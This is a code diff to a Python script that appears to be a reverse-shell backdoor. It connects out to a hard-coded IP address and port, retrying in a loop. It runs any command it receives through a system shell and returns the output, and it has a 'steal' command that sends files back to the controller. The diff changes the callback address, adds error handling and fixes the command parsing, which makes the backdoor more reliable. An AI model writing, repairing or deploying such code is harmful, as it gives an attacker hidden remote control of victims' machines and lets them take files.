@@ -4,8 +4,8 @@ import time
 import json
 import subprocess
 
-IP = "172.20.10.3"
-PORT = 4444
+IP = "192.168.0.100"
+PORT = 5555
 def connect(s):
     while(True):
         time.sleep(10)
@@ -48,22 +48,25 @@ def upload(target, file_name):
 
 def shell(target):
     while(True):
-        command = reliable_receive(target)
-        if command == "exit":
-            quit()
-        if command[:3] == "cd ":
-            os.chdir(command[3:])
-        if command == "clear":
-            pass
-        if command[:5] == "steal":
-            upload(target, command[5:])
-        if command[:6] == "upload":
-            download(target, command[6:])
-        else:
-            execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
-            result = execution.stdout.read() + execution.stderr.read()
-            result = result.decode()
-            reliable_send(result, target)
+        try:
+            command = reliable_receive(target)
+            if command == "exit":
+                quit()
+            elif command[:3] == "cd ":
+                os.chdir(command[3:])
+            elif command == "clear":
+                pass
+            elif command[:5] == "steal":
+                upload(target, command[6:])
+            elif command[:6] == "upload":
+                download(target, command[7:])
+            else:
+                execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+                result = execution.stdout.read() + execution.stderr.read()
+                result = result.decode()
+                reliable_send(result, target)
+        except Exception as e:
+            print(e)
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
